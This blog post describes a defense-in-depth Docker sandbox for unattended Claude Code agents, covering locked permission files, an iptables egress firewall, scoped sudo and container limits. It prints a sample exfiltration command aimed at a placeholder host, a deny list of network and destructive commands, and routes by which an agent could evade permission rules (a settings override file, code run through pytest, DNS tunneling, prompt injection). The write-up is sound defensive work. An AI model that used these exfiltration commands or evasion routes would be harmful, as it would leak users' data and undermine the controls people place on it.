---
layout: post
title: "Building a Hardened Sandbox for Autonomous AI Agents"
summary: "Autonomous AI agents need freedom to work. Here's a defense-in-depth Docker sandbox that gives it to them without the security nightmares."
author: natecibik
date: '2026-03-22 12:00:00 +0530'
category: Claude Code
thumbnail: /assets/img/posts/claude_code_sandbox_crop_3x.png
keywords: claude code, docker, security, sandbox, autonomous agents, AI, defense in depth, iptables, autoresearch, karpathy, research automation
permalink: /blog/hardened-sandbox-for-autonomous-ai-agents/
usemathjax: false
---

Two weeks ago, Andrej Karpathy's [AutoResearch](https://github.com/karpathy/autoresearch) project took the ML world by storm with an elegant yet powerful idea: give an AI agent a training script, an evaluation harness, a GPU, and a set of instructions, then let it work autonomously to drive improvements. While you sleep, the agent iterates obsessively, running hundreds of experiments to explore different ways of improving the eval metrics. The agent modifies code, runs 5-minute experiments, keeps the improvements, discards the failures, logs everything, and will not cease in these ambitions until you come and stop it. If it runs out of ideas, it must think harder or go research for more.

Running ~700 experiments over two days, [Karpathy's agent found ~20 improvements](https://x.com/karpathy/status/2031135152349524125) that combined to produce an 11% speedup on "Time to GPT-2", topping the leaderboard for a project he thought was already well-tuned. Shopify's CEO [Tobias Lütke reported 19% performance gains](https://x.com/tobi/status/2030771823151853938) on a model after running it overnight. The repo already has 49.9K stars at the time of this writing.

AutoResearch is a powerful demonstration of what autonomous AI agents can do when you get out of their way, but this leaves us with a question that begs to be answered: what, exactly, is keeping these agents in their lane while they run unattended for hours?

Anyone who has used Claude Code for more than a few minutes has hit the permission wall. Every `pip install`, every `python script.py`, every `mkdir` — Claude stops and waits for you to give permission. For interactive and collaborative sessions, this is fine. But for AutoResearch-style loops, or any workflow where the whole point is to let the agent work while you don't, this is unacceptable, as you are stuck babysitting an agent who is supposed to be saving you time.

The obvious escape hatch is `--dangerously-skip-permissions`, a flag whose name tells you everything you need to know about Anthropic's opinion on the matter. There's also `bypassPermissions` mode with allow/deny lists, which is better, but still requires you to trust that a sufficiently creative agent won't find a way around your rules using `python -c` or `bash -c`. And if the agent is talking to the internet — downloading packages, hitting APIs, running code it just wrote — you've introduced an attack surface that no permission list can fully address.

So we have a real tension: the more autonomous you want an AI agent to be, the more surface area you expose. And the use cases that benefit most from autonomy (AutoResearch loops, data processing pipelines, literature research, automated testing) are exactly the ones where you *can't* be watching.

This post describes a defense-in-depth approach to solving this problem with a portable, hardened Docker sandbox that I built for running Claude Code agents with both meaningful freedom and meaningful security. The code is available on [GitHub](https://github.com/FoamoftheSea/claude-code-sandbox).

<br>

# The Claude Code Sandbox

## Core Problem: Permission Rules Are Necessary but Not Sufficient

Claude Code's permission system is a solid first layer. You can write rules like `Bash(pytest *)` to allow test execution, or deny `Bash(curl *)` to block network requests. The problem is that these permission rules operate at the string-matching level, and string matching is a leaky abstraction when you're dealing with an intelligent and creative agent that writes and executes code.

For example, consider a simple deny rule: `Bash(curl *)`. This blocks `curl https://exfiltrate.example.com/steal?data=secrets`. But it doesn't block:

```python
# python -c "import urllib.request; urllib.request.urlopen('https://exfiltrate.example.com/steal?data=secrets')"
```

You could deny `Bash(python *)` too, but then your agent can't run any Python scripts, which is a dealbreaker for most ML/data science workflows. The sandbox's permissive profile exists precisely because many legitimate tasks require arbitrary code execution. Once you've allowed `python *`, you've implicitly allowed any network request, any file read, and any system call that Python supports. The real safety has to come from somewhere else: the container's firewall.

<br>

## Defense in Depth: Four Layers

The sandbox enforces security through four independent layers. Each one addresses a different failure mode, and they're designed so that breaching any single layer doesn't give an attacker (or a misbehaving agent) full access.

<br>

### Layer 1: Locked Permission Settings

Claude Code stores its permission rules in `~/.claude/settings.json`. In a normal setup, the agent could theoretically modify this file, as it has write access to its own home directory. The sandbox prevents this in two ways:

First, during container startup, `lock-settings.sh` copies a canonical version of `settings.json` from a root-owned, read-only location baked into the Docker image. It then sets the permissions file to `root:devuser` ownership with `0444` (read-only for everyone):

```bash
cp "$SETTINGS_SRC" "$SETTINGS_DST"
chown root:devuser "$SETTINGS_DST"
chmod 0444 "$SETTINGS_DST"
```

Second (and this is a detail that's easy to miss) Claude Code supports an override file called `settings.local.json`. If an attacker or agent creates this file, it can override the locked settings. So the sandbox pre-claims it:

```bash
echo '{}' > "$SETTINGS_LOCAL"
chown root:devuser "$SETTINGS_LOCAL"
chmod 0444 "$SETTINGS_LOCAL"
```

Now the agent can't modify its own permission rules, and it can't create an override file to bypass them. Even if the agent runs `chmod` or `chown`, it doesn't have the privileges to change root-owned files.

<br>

### Layer 2: Egress Firewall

This is the most important layer. If Layer 1 prevents the agent from changing its rules, Layer 2 prevents it from doing damage *even if the rules are insufficient*.

The firewall uses `iptables` with a default-deny policy on all outbound traffic:

```bash
iptables -P OUTPUT DROP
```

Then it selectively allows only the destinations the agent needs:

```bash
# Docker embedded DNS (required for container networking)
iptables -A OUTPUT -d 127.0.0.11 -p udp --dport 53 -j ACCEPT

# Anthropic API (required for Claude Code itself)
for ip in $(dig +short api.anthropic.com A); do
    iptables -A OUTPUT -d "$ip" -p tcp --dport 443 -j ACCEPT
done
```

Everything else is dropped. If the agent writes a Python script that tries to POST your source code to a remote server, the packets never leave the container. If a malicious dependency tries to phone home during `pip install`, it fails. If prompt injection in a document instructs the agent to exfiltrate data, there's nowhere for it to go.

The firewall also blocks all UDP traffic except to Docker's embedded DNS resolver, which prevents [DNS tunneling](https://www.paloaltonetworks.com/cyberpedia/what-is-dns-tunneling) — a classic exfiltration technique where data is encoded in DNS queries to an attacker-controlled nameserver.

```bash
# Drop all other UDP — prevents DNS tunneling to external resolvers
iptables -A OUTPUT -p udp -j DROP
```

One caveat worth noting: the firewall resolves hostnames to IPs at container startup. If an API endpoint's IP changes during a long session, the agent might lose connectivity. Restarting the container refreshes the resolution. For most use cases this isn't an issue, but it's good to know about. The good news is that if the Anthropic endpoint expires, the agent shuts down, so there can be no attempts at exfiltration. Future work will involve using an `ipset` + `dnsmasq` approach with a cron job to refresh resolutions automatically over time.

<br>

### Layer 3: Non-Root User with Scoped Sudo

The agent runs as `devuser`, not root. Sudo access is limited to exactly two scripts:

```
devuser ALL=(root) NOPASSWD: /usr/local/bin/init-firewall.sh
devuser ALL=(root) NOPASSWD: /usr/local/bin/lock-settings.sh
```

These scripts run at container startup as part of the entrypoint, and they're both root-owned and read-only. The agent can't modify them, can't add new sudoers entries, and can't `sudo` anything else. It has normal user privileges for reading and writing within `/workspace`, which is all it needs for actual work.

<br>

### Layer 4: Container Isolation

The Docker container itself provides the outer boundary:

```yaml
# docker-compose.yml (relevant security settings)
cap_add:
  - NET_ADMIN    # Required for iptables
cap_drop:
  - ALL          # Drop everything else
pids_limit: 256  # Prevents fork-bombing
mem_limit: 4g
cpus: 2          # Tune based on task complexity
```

No Docker socket is mounted (preventing container escape), no SSH keys, no host credentials, no .env files. The container can use up to its resource limits, but it can't [fork-bomb](https://en.wikipedia.org/wiki/Fork_bomb) the host or exhaust system memory. For those running agentic workflows on machines that also have access to proprietary code or cloud credentials, this is particularly important. The agent has no visibility into your host filesystem and only sees what you explicitly mount, nothing else.

<br>

## Permission Profiles: Strict vs. Permissive

The sandbox ships with two profiles. The **strict** profile denies direct arbitrary code execution — no `python *`, no `node *`, no `bash -c *`. It also blocks destructive commands (`rm -rf`, `kill`, `dd`), network tools (`curl`, `wget`, `ssh`), privilege escalation (`sudo`, `docker`, `iptables`), and modifications to sensitive paths (`.git/`, `.env`, `Dockerfile`, Claude settings).

```json
"deny": [
    "Bash(python *)", "Bash(python3 *)",
    "Bash(curl *)", "Bash(wget *)",
    "Bash(nc *)", "Bash(ssh *)",
    "Bash(rm -rf *)", "Bash(rm -r *)",
    "Bash(git push *)", "Bash(git remote *)",
    "Bash(docker *)", "Bash(iptables *)",
    "Bash(env)", "Bash(printenv *)",
    "Edit(/home/devuser/.claude/*)"
]
```

It's worth being honest about the limits of this approach. An allowed command that executes code is itself a code execution vector. For example, `Bash(pytest *)` is allowed in the strict profile — the agent needs to run tests. But the agent also has `Write(src/**)` permission. So it could write a file like `src/test_exploit.py` containing arbitrary Python, then run `pytest src/`, and the code executes. The permission system sees "pytest" and lets it through.

So why bother with the strict profile at all? Two reasons:

First, it directly blocks a set of commands that are dangerous on their own without needing any exploit chain — you can't `curl` data out, you can't `rm -rf /workspace`, you can't `docker exec` into something else, and you can't tamper with your git remote. These are one-step destructive or exfiltrative actions, and the strict profile eliminates them.

Second (and this is the more important point) the strict profile dramatically reduces the agent's exposure to the kind of untrusted content that would motivate it to try an exploit in the first place. In the permissive profile, the agent downloads files from the internet, runs arbitrary Python on them, and processes untrusted content from external sources. Each of those steps is an opportunity for prompt injection or a malicious payload to influence the agent's behavior. In the strict profile, the agent is reading and editing local source code that you already control. The attack surface for *reaching* the agent with a malicious instruction is much smaller, which makes the indirect exploit path (write a malicious test, execute it via pytest) far less likely to ever be triggered.

The **permissive** profile allows `Bash(python *)` and `Bash(python3 *)` because workflows such as ML training, data processing, and research automation genuinely need them. When you switch to this profile, the egress firewall becomes your primary defense. The agent can execute arbitrary Python, but it can't send data anywhere you haven't explicitly allowed.

<br>

## Testing the Sandbox

As they say: if you can't test it, you can't trust it. The sandbox includes `test-sandbox.sh`, which runs 28 automated security checks inside the container:

- Init scripts succeed and produce correct state
- Settings are locked (root-owned, read-only, tamper-proof)
- `settings.local.json` is pre-claimed (blocks the override attack vector)
- Firewall default-deny policy is active
- Blocked destinations (e.g., `google.com`) are unreachable
- Allowed destinations (Anthropic API) are reachable
- Agent cannot escalate privileges (`sudo`, `chmod`, sudoers)
- Sensitive paths are not exposed (Docker socket, SSH keys, `/etc/shadow`)
- Init scripts and canonical settings are read-only

Users of the sandbox should run these tests after every configuration change. It is the difference between "I think the sandbox is secure" and "I've verified the sandbox is secure."

<br>

# Sandbox Use Cases

## Use Case 1: Running AutoResearch Locally

Let's bring this back to the motivating example. If you want to run Karpathy's AutoResearch loop on your local machine with Claude Code, you need the agent to execute Python, run PyTorch training, read/write files, and use git, all in a loop that might run for hundreds of iterations overnight.

With the sandbox, you'd configure:

- **Permissive profile** — the agent needs `python *` for training
- **Firewall allowlist** — at minimum, just the Anthropic API
- **Volume mount** — the autoresearch repo mounted at `/workspace`

That's it for the basic case. The agent has everything it needs to iterate on `train.py`, run experiments, evaluate results, and commit improvements. And it *cannot* reach any endpoint besides the Anthropic API, so even if something goes sideways, such as a training script that accidentally makes a network call, or an installed dependency with a phone-home backdoor, the firewall drops it silently.

However, the basic case may not be how you want to run it. AutoResearch's default `program.md` instructs the agent to never stop experimenting, and to seek out new ideas when it exhausts its current ones: *"If you run out of ideas, think harder — read papers referenced in the code, re-read the in-scope files for new angles, try combining previous near-misses, try more radical architectural changes."* Unless the user has preemptively placed every piece of conceivably relevant literature inside the workspace (which is unlikely and works against the principle of agentic research), that instruction to "read papers" implies the agent needs to be able to look up and download papers to inform its experimentation, and with the firewall locked to only the Anthropic API, it can't.

This is where the sandbox's configurable allowlist shines. You can choose your security posture based on how much autonomy you want the agent to have:

- **Closed loop** (maximum isolation): Allowlist only the Anthropic API. The agent works entirely with local code, pre-downloaded literature, and its own reasoning. If it hits a wall, it has to find new ideas from what's already in the repo. Most secure, but the agent runs out of steam sooner.
- **Research-enabled loop** (practical balance): Add `arxiv.org` and `api.semanticscholar.org` to the allowlist. Now the agent can look up papers, read abstracts, and follow citations when it needs inspiration for its next experiment, while still being unable to reach anything else. This is the configuration I'd recommend for overnight runs where you want the agent to stay productive as long as possible.

The sandbox lets you slide between these positions by editing a few lines in `init-firewall.sh`, rather than choosing between total lockdown and total trust.

<br>

## Use Case 2: An Autonomous Research Pipeline

The second use case that motivated this sandbox is a literature research pipeline. I wanted Claude Code to download academic papers from arxiv, extract text and figures using `pymupdf4llm`, query the Semantic Scholar API for citation graphs, and assemble everything into a structured research document — without me approving every HTTP request and script execution along the way.

This is a workflow where the permissive profile is mandatory. The agent needs to run Python scripts that make network requests to specific APIs and process the results. Without the sandbox, my options are:

1. **Babysit every command** — defeats the purpose of automation
2. **`--dangerously-skip-permissions`** — the agent can reach the entire internet with no restrictions and send attackers anything on my computer
3. **Run on a throwaway cloud instance** — no egress controls, and you're trusting the agent with whatever's on the instance

With the sandbox, I add `arxiv.org`, `api.semanticscholar.org`, and `pypi.org` to the firewall allowlist, and the agent can do its job while being unable to reach anything else. Papers get downloaded, text gets extracted, citation chains get traced, and the agent builds the research document — all autonomously, all sandboxed.

For a research session, I can kick it off and walk away:

```bash
cd sandbox/
docker compose run claude-dev claude \
    -p "Read /workspace/research_instructions.md and process the brief in /workspace/research/briefs/knowledge-distillation-brief.md"
```

When I come back, there's a structured research document with paper summaries, citation chains, and extracted figures. The agent had full autonomy within its sandbox, it just couldn't do anything outside of it.

<br>

# Sandbox Limitations

The sandbox is an execution environment hardening tool, not a complete security solution. Here are some known limitations:

- **Prompt injection** — Assuming that you didn't start up the sandbox with a malicious prompt already hidden in your repo, the sandbox significantly mitigates both the risks and consequences of prompt injection, but it is not completely bulletproof. The firewall limits where exfiltrated data can go, the use of the strict profile or tight allowlists limits the untrusted content the agent can encounter, and container isolation limits what the agent can see. The residual risk is that the agent could still do damage within its allowed permissions and allowed network destinations, but that's a much smaller blast radius than no sandbox at all.
- **Logic bugs** — The agent may write code that is syntactically valid but semantically wrong. Your test suite is the defense here, not the sandbox.
- **Credential exposure in source code** — If your mounted workspace contains hardcoded secrets, the agent can read them. Keep secrets out of source code.

Keep these things in mind as you use the sandbox. It is important to be aware about what a security control *doesn't* do. Overconfidence in any single layer is how breaches happen.

<br>

# Getting Started

The sandbox is designed to be dropped into any project:

```bash
# Clone it
git clone https://github.com/FoamoftheSea/claude-code-sandbox.git

# Build
cd claude-code-sandbox/
docker compose build

# Test
bash test-sandbox.sh

# Authenticate (first time only)
docker compose run claude-dev claude login

# Use it
docker compose run claude-dev claude -p "your task here" --max-turns 20
```

Before building, open docker-compose.yml and update the volume mount to point at your project. The default is `../src:/workspace` — change the left side to the relative path to whatever directory the agent should work in. **This is also a good moment to think about scope: only mount the directory the agent actually needs.** If the agent is running AutoResearch, mount the autoresearch repo, not your entire home directory. The less the agent can see, the smaller the blast radius if something goes wrong.

From there, customize the firewall allowlist in `init-firewall.sh`, the permission rules in `claude-settings.json`, and the project dependencies in the `Dockerfile`. The [README](https://github.com/FoamoftheSea/claude-code-sandbox) has detailed instructions for each.

<br>

# Conclusion

If you're running AutoResearch loops, ML pipelines, data processing jobs, or any workflow where Claude Code needs to execute Python autonomously, I'd encourage you to try the sandbox. It won't change what the agent can do, it changes what the agent *can't* do. The ability to start a task, walk away, and come back to finished work without worrying about what the agent did in the meantime is a qualitative shift in how these tools can be used.

Karpathy's vision for AutoResearch is that it becomes "a research community" of agents collaborating asynchronously. As these autonomous loops get longer-running and more powerful, the security question only gets more important. The sandbox isn't the final answer, but it's a practical one that you can run today.

The code is MIT licensed and available at [github.com/FoamoftheSea/claude-code-sandbox](https://github.com/FoamoftheSea/claude-code-sandbox). Issues and PRs are welcome.
